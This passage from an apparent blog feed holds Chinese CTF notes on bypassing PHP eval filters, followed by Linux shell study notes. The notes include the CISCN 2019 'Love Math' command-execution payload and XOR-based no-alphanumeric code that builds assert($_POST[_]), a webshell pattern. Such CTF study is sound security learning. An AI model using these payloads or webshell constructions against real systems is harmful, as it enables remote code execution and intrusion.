class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#可用函数</span></span><br><span class="line"><span class="comment">#获取内置函数 </span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$value</span>) )&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h2 id="数学函数构造payload"><a href="#数学函数构造payload" class="headerlink" title="数学函数构造payload"></a>数学函数构造payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;706870696e666f&#x27;</span>) →phpinfo</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;73797374656d&#x27;</span>)  → system  </span><br></pre></td></tr></table></figure><h4 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">黑名单：空格,\t,\r,\n,<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;&quot;</span>,[]</span><br><span class="line">    </span><br><span class="line">正则匹配表达式：/[a-zA-Z_\x7f-\xff][a-zA-Z_0-<span class="number">9</span>\x7f-\xff]*/</span><br><span class="line">正则匹配到的部分进行白名单过滤    </span><br><span class="line">白名单：只能使用数学函数  </span><br><span class="line"></span><br><span class="line">这里利用php的动态函数</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(cat /flag);</span><br><span class="line">等价与<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line">所以我们需要构造<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]=system <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]=cat /flag  <span class="variable">$a</span>(<span class="variable">$b</span>)</span><br><span class="line"></span><br><span class="line">需要我们构造的是_GET和[]，[]可以用&#123;&#125;替代，_GET用<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(_GET对应的十进制))</span><br><span class="line">因为有正则，所以只能用不含有字母的进制如<span class="number">10</span>进制或者<span class="number">8</span>进制，所以需要用dechex将<span class="number">10</span>进制转为<span class="number">16</span>进制</span><br><span class="line">hex2bin也不能出现，用<span class="title function_ invoke__">base_convert</span>()来生成：</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">432335067717</span>,<span class="number">8</span>,<span class="number">36</span>)</span><br><span class="line"> </span><br><span class="line">将_GET保存在变量中（为了保证长度小于<span class="number">80</span>）</span><br><span class="line"><span class="variable">$pi</span>=<span class="variable">$base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(_GET对应的十进制))→_GET</span><br><span class="line"><span class="variable">$$pi</span>&#123;pi&#125;→<span class="variable">$_GET</span>[pi]</span><br><span class="line"><span class="variable">$$pi</span>&#123;abs&#125;→<span class="variable">$_GET</span>[abs]</span><br><span class="line"></span><br><span class="line">最终payload：</span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag    </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220626151220775-1687682103386.png" alt="image-20220626151220775"></p><p><img src="/../images/image-20220626151314181-1687682103387.png" alt="image-20220626151314181"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不直接用hex2bin(dechex(system cat /flag对应的十进制))是因为数值超过dechex的处理范围，返回为0</span><br></pre></td></tr></table></figure><h2 id="无字母数字和一些符号"><a href="#无字母数字和一些符号" class="headerlink" title="无字母数字和一些符号"></a>无字母数字和一些符号</h2><p><a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用空字符-运算构造"><a href="#利用空字符-运算构造" class="headerlink" title="利用空字符^运算构造"></a>利用空字符^运算构造</h4><ul><li><p>单个字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">127</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">127</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s^%s&quot;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)),<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>))).<span class="string">&quot;=&gt;&quot;</span>. (<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">%<span class="number">8</span>C^%FF=&gt;s</span><br></pre></td></tr></table></figure><blockquote><p>((%FE^%AE).(%FE^%96).(%FE^%AE).(%FE^%97).(%FE^%90).(%FE^%98).(%FD^%92))(); →phpinfo();</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">#想构造的字符串  print_r(scandir(&#x27;.&#x27;))</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;scandir&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$payload</span> .= <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>.=<span class="string">&#x27;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">127</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">#chr(255)选择哪一个不可见字符来构造</span></span><br><span class="line">        <span class="variable">$k</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$x</span>[<span class="variable">$i</span>]) </span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><blockquote><p>$</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《Linux命令行与shell脚本编程大全》 笔记</title>
      <link href="/2023/05/31/linux-shell/"/>
      <url>/2023/05/31/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>前言：</p><p>以下内容为阅读<code>Linux命令行与shell脚本编程大全.第3版 (布鲁姆，布雷斯纳汉) (z-lib.org)</code>笔记。</p><p>注：下面使用的linux系统为阿里云服务器Centos7（redhat）或者kali（debian）系统</p><hr><h1 id="了解shell"><a href="#了解shell" class="headerlink" title="了解shell"></a>了解shell</h1><h3 id="shell类型"><a href="#shell类型" class="headerlink" title="shell类型"></a>shell类型</h3><p><img src="/../images/image-20220818151112756-1686151304118.png" alt="image-20220818151112756"></p><blockquote><p>当用户登录终端的时候，通常会启动一个默认的交互式shell。</p><p>系统究竟启动哪个shell，这取决于用户ID配置系统启动什么样的shell程序。</p><p>在&#x2F;etc&#x2F;passwd文件中，在用户ID记录的第7个字段中列出了默认的shell程序。</p></blockquote><p>例如在kali中登录终端时使用的是zsh类型的shell.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -F /usr/bin/zsh</span><br><span class="line">/usr/bin/zsh*</span><br></pre></td></tr></table></figure><p>说明&#x2F;usr&#x2F;bin&#x2F;zsh是一个可执行程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4  3月 14  2022 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>可以发现用户和系统使用的shell类型不同。</p><p>查看所有shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure><blockquote><p>通常说的sh只是一个软连接，并不是真的有一个shell叫sh。</p><p>在debian系操作系统中，sh指向dash；</p><p>在centos系操作系统中，sh指向bash。</p></blockquote><h3 id="shell的父子关系"><a href="#shell的父子关系" class="headerlink" title="shell的父子关系"></a>shell的父子关系</h3><p><img src="/../images/image-20220819202328859-1686151304119.png" alt="image-20220819202328859"></p><p>在右边的命令行中可以看到bash进程的ppid就是&#x2F;user&#x2F;bin&#x2F;zsh的pid，所以二者是父子关系。</p><p><img src="/../images/image-20220819202343322-1696733797342.png"></p><p>多次创建bash</p><img src="E:\typora img\image-20220819203036919.png" alt="image-20220819203036919" style="zoom: 67%;" /><img src="E:\typora img\image-20220819203046906.png" alt="image-20220819203046906" style="zoom:67%;" /><p>退出当前shell，<code>exit</code></p><img src="E:\typora img\image-20220819203202199.png" alt="image-20220819203202199" style="zoom:67%;" /><p>启动shell时的参数</p><img src="E:\typora img\image-20220923170946734.png" alt="image-20220923170946734" style="zoom:67%;" title=1/><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ bash -r</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$ cd ../</span><br><span class="line">bash: cd: restricted</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$</span><br></pre></td></tr></table></figure><h3 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h3><blockquote><p>以;隔开的多个命令</p></blockquote><p><code>pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL</code></p><p>进程列表</p><blockquote><p>创建一个子shell来执行命令列表</p></blockquote><p><code> (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</code></p><p><code>echo $BASH_SUBSHELL</code>：输出子shell数量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]#  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">/etc</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL))</span><br><span class="line">/root</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>可以看出有几个括号就有几个子shell</p><h1 id="使用linux环境变量"><a href="#使用linux环境变量" class="headerlink" title="使用linux环境变量"></a>使用linux环境变量</h1><ul><li><p>定义</p><blockquote><p><strong>存储有关shell会话和工作环境的信息的变量称为环境变量</strong></p></blockquote></li><li><p>分类</p><ul><li><p>全局变量</p></li><li><p>局部变量</p><blockquote><p>这里的范围指的是变量存在于哪些shell会话中</p></blockquote></li></ul></li></ul><h3 id="全局环境变量"><a href="#全局环境变量" class="headerlink" title="全局环境变量"></a>全局环境变量</h3><blockquote><p>系统环境变量基本上都是使用全大写字母，以区别于普通用户的环境变量。</p></blockquote><p>查看全局变量</p><ul><li><p><code>env</code> 或者<code>printenv</code>：<strong>只</strong>输出全部的<strong>全局</strong>变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# env  (printenv输出的与其相同)</span><br><span class="line">XDG_SESSION_ID=897</span><br><span class="line">HOSTNAME=izwz99bgx9y93dmv0mir0ez</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">USER=root</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>printenv  var_name</code>或者 <code>echo $var_name</code>：输出特定变量的值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER</span><br><span class="line">root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>全局环境变量存在于所有的shell会话中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11371 11337  0 20:31 pts/0    00:00:00 bash</span><br><span class="line">root     11382 11371  0 20:31 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11383 11337  0 20:32 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在这个例子中，用bash命令生成一个子shell后，显示了HOME环境变量的当前值，这个值和父shell中的一模一样，都是&#x2F;root。</p></blockquote><h3 id="局部环境变量"><a href="#局部环境变量" class="headerlink" title="局部环境变量"></a>局部环境变量</h3><p>查看局部变量</p><blockquote><p>在Linux系统并没有一个只显示局部环境变量的命令。</p></blockquote><ul><li><p><code>set</code></p><blockquote><p>set命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# set</span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=()</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">BASH_LINENO=()</span><br><span class="line">BASH_SOURCE=()</span><br><span class="line">BASH_VERSINFO=([0]=&quot;4&quot; [1]=&quot;2&quot; [2]=&quot;46&quot; [3]=&quot;2&quot; [4]=&quot;release&quot; [5]=&quot;x86_64-redhat-linux-gnu&quot;)</span><br><span class="line">BASH_VERSION=&#x27;4.2.46(2)-release&#x27;</span><br><span class="line">COLUMNS=210</span><br><span class="line">DIRSTACK=()</span><br><span class="line">EUID=0</span><br><span class="line">GROUPS=()</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>set命令会显示出全局变量、局部变量以及用户定义变量。它还会按照字母顺序对结果进行排序。</p><p>env和printenv命令同set命令的区别在于前两个命令不会对变量排序，也不会输出局部变量和用户定义变量。</p></blockquote></li></ul><h3 id="设置局部用户自定义变量"><a href="#设置局部用户自定义变量" class="headerlink" title="设置局部用户自定义变量"></a>设置局部用户自定义变量</h3><blockquote><p>一旦启动了bash shell（或者执行一个shell脚本），就能创建在这个shell进程内可见的局部变量了。</p><p>可以通过等号给环境变量赋值，值可以是数值或字符串。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line"></span><br><span class="line">注：因为没有定义first_var变量，所以输出为空。</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world</span><br><span class="line">-bash: =hello: command not found</span><br><span class="line">注：定义变量时无需加上$</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world</span><br><span class="line">-bash: world: command not found</span><br><span class="line">注：在为变量赋值字符串时，如果字符串有引号，就需要用单引号括起来。</span><br><span class="line">引用：没有单引号的话，bash shell会以为下一个词是另一个要执行的命令</span><br><span class="line"></span><br><span class="line">root@izwz99bgx9y93dmv0mir0ez ~]# first_var =&#x27;hello world&#x27;</span><br><span class="line">-bash: first_var: command not found</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var= &#x27;hello world&#x27;</span><br><span class="line">-bash: hello world: command not found</span><br><span class="line">注：变量和=和值之间不能有空格，否则shell会把其当成命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=&#x27;hello world&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line">hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>局部变量的范围</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11415 11337  0 20:57 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# child_var=&#x27;hello khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line">hello khaz</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="设置全局变量"></a>设置全局变量</h3><blockquote><p>创建全局环境变量的方法是先<strong>创建</strong>一个局部环境变量，然后再把它<strong>导出</strong>到全局环境中。</p></blockquote><p><code>export var_name</code>：导出子shell的局部变量到全局环境中（<strong>临时修改</strong>）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11566 pts/1    00:00:00 bash</span><br><span class="line">11585 pts/1    00:00:00  \_ ps</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=&#x27;khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# export a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>我发现只能在登录终端的那个shell中export，不能在子shell中export？</p><p>因为export的作用是让子shell可以继承父shell导出过的变量。</p><p>并且如果在子shell中修改全局变量的值，也不会影响到父shell中该全局变量的值。</p></blockquote><h3 id="删除环境变量"><a href="#删除环境变量" class="headerlink" title="删除环境变量"></a>删除环境变量</h3><p><code>unset var_name</code>：删除环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# unset a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br></pre></td></tr></table></figure><h3 id="设置PATH环境变量"><a href="#设置PATH环境变量" class="headerlink" title="设置PATH环境变量"></a>设置PATH环境变量</h3><blockquote><p>PATH环境变量定义了用于进行命令和程序查找的目录。</p></blockquote><p>下面演示了创建自定义命令，并可以在任何路径下使用该命令。</p><ul><li><p>创建自定义命令，命令内容为输出’hello khaz’，并将其移动到存放自定义命令的目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# vim hello </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;hello khaz&#x27;</span><br><span class="line">:wq</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>因为与命令不在同一路径下，提示找不到命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">-bash: hello: command not found</span><br></pre></td></tr></table></figure></li><li><p>查看并增加PATH（路径以：分隔）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>再次输入命令成功执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br></pre></td></tr></table></figure><blockquote><p>这种方法对PATH变量的修改只能持续到退出或重启系统。</p></blockquote></li></ul><h3 id="让环境变量的作用持久化"><a href="#让环境变量的作用持久化" class="headerlink" title="让环境变量的作用持久化"></a>让环境变量的作用持久化</h3><blockquote><p>把我们设置的环境变量放在shell的启动文件&#x2F;环境文件中。</p><p>或者开机启动项<code>/etc/init.d/</code>和<code>/etc/profile.d/</code></p></blockquote><ul><li><p>启动文件&#x2F;环境文件</p><blockquote><p>登入Linux系统启动一个bash shell时，默认情况下bash会在几个文件中查找命令。</p><p>这些文件叫作启动文件或环境文件。</p></blockquote></li><li><p>5个不同的启动文件</p><p> &#x2F;etc&#x2F;profile </p><p> $HOME&#x2F;.bash_profile </p><p> $HOME&#x2F;.bashrc </p><p> $HOME&#x2F;.bash_login </p><p> $HOME&#x2F;.profile </p></li><li><p>&#x2F;etc&#x2F;profile文件</p><blockquote><p>&#x2F;etc&#x2F;profile文件是bash shell默认的的主启动文件。</p><p>只要你登录了Linux系统，bash就会执行&#x2F;etc&#x2F;profile启动文件中的命令。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">for i in /etc/profile.d/*.sh ; do</span><br><span class="line">    if [ -r &quot;$i&quot; ]; then</span><br><span class="line">        if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then </span><br><span class="line">            . &quot;$i&quot;</span><br><span class="line">        else</span><br><span class="line">            . &quot;$i&quot; &gt;/dev/null</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>其中的for语句为Linux系统提供了一个放置特定应用程序启动文件的地方，当用户登录时，shell会执行这些文件。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/</span><br><span class="line">total 